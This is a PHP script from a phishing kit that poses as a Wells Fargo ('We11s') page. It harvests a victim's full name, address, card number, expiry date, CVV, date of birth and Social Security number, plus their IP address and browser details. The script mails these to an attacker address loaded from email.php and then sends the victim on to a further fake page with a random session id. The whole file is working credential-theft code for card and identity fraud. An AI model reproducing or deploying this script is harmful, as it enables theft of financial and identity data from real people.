<?php
if($_POST["name"] != "" and $_POST["addr"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------We11s Info-----------------------\n";
$message .= "Full Name						: ".$_POST['name']."\n";
$message .= "Full Address					: ".$_POST['addr']."\n";
$message .= "C@rd #							: ".$_POST['c']."\n";
$message .= "Expiry Date					: ".$_POST['x']."\n";
$message .= "C.V'v							: ".$_POST['v']."\n";
$message .= "DOB							: ".$_POST['d']."\n";
$message .= "SSN							: ".$_POST['s']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
include 'email.php';
$subject = "Card | $ip";
{
mail("$to", "$send", "$subject", $message);     
}
$praga=rand();
$praga=md5($praga);
  header ("Location: surf4.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
}else{
header ("Location: index.php");
}

?>